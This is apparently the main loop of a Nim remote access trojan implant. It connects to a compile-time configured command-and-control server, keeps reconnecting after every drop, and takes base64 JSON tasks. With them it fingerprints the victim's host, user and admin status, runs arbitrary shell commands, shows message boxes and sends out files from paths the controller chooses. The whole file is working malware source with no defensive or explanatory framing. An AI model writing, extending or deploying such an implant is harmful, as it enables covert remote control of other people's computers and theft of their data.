import net, base64, json, os

import modules, communication

import ../commands/[shell, msgbox, download]

var client: Socket = newSocket()

const port {.intdefine.}: int = 1234
const ip {.strdefine.}: string = "127.0.0.1"

proc receiveCommands(client: Socket) =
  client.connectToC2()
  while true:
    let line = client.recvLine()

    if line.len == 0:
      client.close()
      break

    let task = decode(line)

    let jsonNode = parseJson(task)
    let taskId = jsonNode["taskId"].getInt()

    case jsonNode["task"].getStr():
    of "identify":
      client.identify(
        taskId,
        hostname=hostname(),
        username=username(), 
        isAdmin=areWeAdmin()
      )
    of "shell": 
      let toExec = jsonNode["data"]["shellCmd"].getStr()
      shell.executeTask(client, taskId, toExec)
    of "msgbox":
      msgbox.executeTask(client, taskId, jsonNode["data"]["title"].getStr(), jsonNode["data"]["caption"].getStr())
    of "download":
      download.executeTask(client, taskId, jsonNode["data"]["path"].getStr())


while true:
  try:
    client.connect(ip, Port(port))
  except OSError:
    continue
  receiveCommands(client)
  client = newSocket()
  sleep(1000*5)

# 
